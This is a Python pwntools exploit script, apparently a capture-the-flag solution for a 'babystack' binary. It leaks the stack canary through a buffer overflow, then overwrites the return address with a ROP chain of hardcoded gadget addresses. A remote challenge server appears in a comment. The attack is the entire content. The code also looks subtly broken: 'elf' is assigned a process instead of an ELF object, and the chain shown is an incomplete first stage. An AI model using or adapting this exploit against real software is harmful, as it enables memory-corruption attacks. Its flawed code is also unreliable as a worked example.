from pwn import *
context.log_level = 'debug'
sh=process('./babystack')
elf = process('./babystack')
libc = ELF('./libc-2.23.so')

#sh=remote('111.198.29.45','32440')
def store(con):
	sh.sendlineafter('>> ','1')
	sh.sendline(con)

def show():
	sh.sendlineafter('>> ','2')


store('a'*0x88)
show()
sh.recvuntil('\n')
canary = u64(sh.recv(7)+'\x00')
print hex(canary)

#gdb.attach(sh)
pop_rdi_ret = 0x400a93
store('b'*0x88+p64(canary)+'deadbeef'+ p64(pop_rdi_ret) + p64(0x600fa8)+p64(0x400690)+p64(0x600908))
#gdb.attach(sh)
sh.interactive()
